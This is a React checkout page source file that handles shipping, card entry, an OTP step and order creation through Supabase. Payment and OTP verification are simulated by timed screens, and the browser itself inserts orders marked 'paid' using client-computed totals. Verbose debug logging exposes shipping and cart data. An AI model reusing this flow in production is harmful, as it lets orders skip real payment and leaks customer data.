import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Package } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { useCart } from '@/hooks/useCart';
import { usePaymentSettings } from '@/hooks/usePaymentSettings';
import { useCurrency } from '@/hooks/useCurrency';
import { toast } from '@/hooks/use-toast';
import { Header } from '@/components/layout/Header';

import CheckoutStepper, { CheckoutStep } from '@/components/checkout/CheckoutStepper';
import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
import CardOTPVerification from '@/components/checkout/CardOTPVerification';
import OrderReview from '@/components/checkout/OrderReview';
import OrderConfirmationSuccess from '@/components/checkout/OrderConfirmationSuccess';
import PaymentProcessingScreen from '@/components/checkout/PaymentProcessingScreen';

export default function CartCheckout() {
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();
  const { items, clearCart, total } = useCart();
  const { formatPriceOnly } = useCurrency();
  const { loading: settingsLoading } = usePaymentSettings();

  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shippingData, setShippingData] = useState<ShippingFormData | null>(null);
  const [cardData, setCardData] = useState<CardFormData | null>(null);
  const [orderIds, setOrderIds] = useState<string[]>([]);
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [confirmedTotal, setConfirmedTotal] = useState<number>(0);

  // Debug logging for state changes
  useEffect(() => {
    console.log('CartCheckout State Update:', {
      step,
      cartTotal: total,
      confirmedTotal,
      itemsCount: items.length,
      orderIdsCount: orderIds.length,
      hasShippingData: !!shippingData,
      hasCardData: !!cardData,
    });
  }, [step, total, confirmedTotal, items.length, orderIds.length, shippingData, cardData]);

  /* ---------------- Guards ---------------- */
  useEffect(() => {
    if (!authLoading && !user) {
      navigate('/auth?redirect=/cart/checkout');
    }
    if (items.length === 0 && step === 'shipping') {
      navigate('/cart');
    }
  }, [user, authLoading, items.length, step, navigate]);

  /* ---------------- Shipping ---------------- */
  const handleShippingSubmit = (data: ShippingFormData) => {
    console.log('Shipping submitted:', data);
    setShippingData(data);
    setStep('payment');
  };

  /* ---------------- Payment ---------------- */
  const handlePaymentSubmit = async (data: CardFormData & { is3DSecure?: boolean }) => {
    console.log('Payment submitted, cart total:', total);
    if (!user) return;

    setCardData(data);
    setStep('processingPayment');

    try {
      const lastFour = data.cardNumber.replace(/\s/g, '').slice(-4);
      const brand = detectCardBrand(data.cardNumber);

      console.log('Creating payment transaction for amount:', total);
      const { data: tx, error } = await supabase
        .from('payment_transactions')
        .insert({
          user_id: user.id,
          amount: total,
          currency: 'USD',
          card_last_four: lastFour,
          card_brand: brand,
          status: 'pending_otp',
        })
        .select()
        .single();

      if (error) throw error;

      console.log('Payment transaction created:', tx.id);
      setTransactionId(tx.id);
    } catch (e: any) {
      console.error('Payment error:', e);
      toast({ title: 'Payment error', description: e.message, variant: 'destructive' });
      setStep('payment');
    }
  };

  /* ---------------- OTP ---------------- */
  const handleOTPVerified = async () => {
    console.log('OTP verified, transactionId:', transactionId);
    if (!transactionId) return;

    setStep('processingOtp');

    await supabase
      .from('payment_transactions')
      .update({ status: 'otp_verified', otp_verified: true })
      .eq('id', transactionId);
  };

  /* ---------------- Review ---------------- */
  const handleConfirmOrder = async () => {
    console.log('=======================');
    console.log('handleConfirmOrder START');
    console.log('Cart items:', items);
    console.log('Cart total from useCart():', total);
    console.log('User:', user?.id);
    console.log('=======================');

    if (!user || !shippingData || !cardData) {
      console.log('Missing required data:', { user, shippingData, cardData });
      return;
    }

    try {
      const ids: string[] = [];
      
      // Save total BEFORE clearing cart
      console.log('Setting confirmedTotal to:', total);
      setConfirmedTotal(total);
      
      let calculatedTotal = 0;

      for (const item of items) {
        const itemTotal = item.price * item.quantity;
        calculatedTotal += itemTotal;
        
        console.log('Creating order for item:', {
          title: item.title,
          price: item.price,
          quantity: item.quantity,
          itemTotal: itemTotal,
          seller_id: item.seller_id
        });

        const { data, error } = await supabase
          .from('orders')
          .insert({
            buyer_id: user.id,
            seller_id: item.seller_id,
            product_id: item.product_id,
            quantity: item.quantity,
            total_price: itemTotal,
            status: 'paid',
          })
          .select()
          .single();

        if (error) {
          console.error('Order creation error:', error);
          throw error;
        }
        
        console.log('Order created with ID:', data.id);
        ids.push(data.id);
      }

      console.log('=======================');
      console.log('handleConfirmOrder COMPLETE');
      console.log('Order IDs created:', ids);
      console.log('Calculated total from items:', calculatedTotal);
      console.log('Confirmed total state:', confirmedTotal);
      console.log('Cart total before clear:', total);
      console.log('=======================');

      setOrderIds(ids);
      clearCart(); // This will set useCart().total to 0
      console.log('Cart cleared, step changing to confirmation');
      setStep('confirmation');
    } catch (e: any) {
      console.error('Order error:', e);
      toast({ title: 'Order error', description: e.message, variant: 'destructive' });
    }
  };

  const detectCardBrand = (num: string) => {
    const c = num.replace(/\s/g, '');
    if (/^4/.test(c)) return 'Visa';
    if (/^5[1-5]/.test(c)) return 'Mastercard';
    if (/^3[47]/.test(c)) return 'American Express';
    return 'Card';
  };

  if (authLoading || settingsLoading) {
    console.log('CartCheckout loading...');
    return null;
  }

  console.log('Rendering CartCheckout, step:', step, 'cart total:', total);

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="container py-8">
        <CheckoutStepper currentStep={step} />

        <div className="grid lg:grid-cols-3 gap-8 mt-6">
          <div className="lg:col-span-2">
            {step === 'shipping' && <ShippingAddressForm onSubmit={handleShippingSubmit} />}

            {step === 'payment' && (
              <PaymentDetailsForm 
                amount={total} 
                currency="USD" 
                onSubmit={handlePaymentSubmit} 
              />
            )}

            {step === 'processingPayment' && (
              <PaymentProcessingScreen
                title="Processing payment…"
                description="Confirming your card details."
                onDone={() => {
                  toast({ title: 'OTP Sent', description: 'Enter the code sent to your phone.' });
                  setStep('otp');
                }}
              />
            )}

            {step === 'otp' && cardData && (
              <CardOTPVerification
                cardLastFour={cardData.cardNumber.slice(-4)}
                onVerified={handleOTPVerified}
                onResend={() => toast({ title: 'OTP resent' })}
              />
            )}

            {step === 'processingOtp' && (
              <PaymentProcessingScreen
                title="Verifying OTP…"
                description="Please wait while we verify your card."
                onDone={() => setStep('review')}
              />
            )}

            {step === 'review' && shippingData && cardData && (
              <>
                {console.log('Rendering OrderReview with total:', total)}
                <OrderReview
                  items={items}
                  shippingData={shippingData}
                  cardData={cardData}
                  totalAmount={total}
                  currency="USD"
                  onConfirm={handleConfirmOrder}
                  onEditShipping={() => setStep('shipping')}
                  onEditPayment={() => setStep('payment')}
                />
              </>
            )}

            {step === 'confirmation' && shippingData && (
              <>
                {console.log('=======================')}
                {console.log('Rendering OrderConfirmationSuccess')}
                {console.log('Order IDs:', orderIds)}
                {console.log('Confirmed total passed to component:', confirmedTotal)}
                {console.log('Cart total (should be 0):', total)}
                {console.log('=======================')}
                <OrderConfirmationSuccess
                  orderIds={orderIds}
                  totalAmount={confirmedTotal}
                  currency="USD"
                />
              </>
            )}
          </div>

          {step !== 'confirmation' && (
            <div className="lg:col-span-1">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Package className="h-5 w-5" />
                    Order Summary
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 mb-4">
                    {items.map((item) => (
                      <div key={item.id} className="flex justify-between text-sm">
                        <span className="truncate max-w-[120px]">{item.title}</span>
                        <span>{formatPriceOnly(item.price * item.quantity)}</span>
                      </div>
                    ))}
                  </div>
                  <Separator />
                  <div className="flex justify-between text-lg font-bold mt-4">
                    <span>Total</span>
                    <span>{formatPriceOnly(total)}</span>
                  </div>
                  <div className="mt-4 text-xs text-muted-foreground">
                    <p>Debug: {items.length} items, ${total.toFixed(2)} total</p>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
